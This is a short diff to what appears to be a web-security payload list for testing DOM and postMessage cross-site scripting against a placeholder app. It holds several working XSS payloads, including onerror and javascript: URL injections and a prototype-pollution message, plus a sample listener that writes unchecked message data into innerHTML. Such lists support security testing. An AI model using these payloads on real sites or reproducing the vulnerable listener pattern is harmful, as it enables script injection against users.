@@ -44,7 +44,7 @@ alert`dom-marker`
 <script>var w=window.open('https://app.example.test/');setTimeout(function(){w.postMessage('dom-pm-marker','*')},2000)</script>
 <script>var w=window.open('https://app.example.test/');setTimeout(function(){w.postMessage({"type":"update","html":"<img src=x onerror=document.title='dom-pm-marker'>"},'*')},2000)</script>
 <script>var w=window.open('https://app.example.test/');setTimeout(function(){w.postMessage('{"action":"redirect","url":"javascript:document.title=\'dom-pm-marker\'"}','*')},2000)</script>
-<script>var w=window.open('https://app.example.test/');setTimeout(function(){w.postMessage({"__proto__":{"polluted":"dom-pm-marker"}},'*')},2000)</script>
+<script>var w=window.open('https://app.example.test/');setTimeout(function(){w.postMessage(JSON.parse('{"__proto__":{"polluted":"dom-pm-marker"}}'),'*')},2000)</script>
 
 # postMessage: listener-side patterns to look for in the source (missing or weak origin checks)
 window.addEventListener('message', function(e){ document.body.innerHTML = e.data })
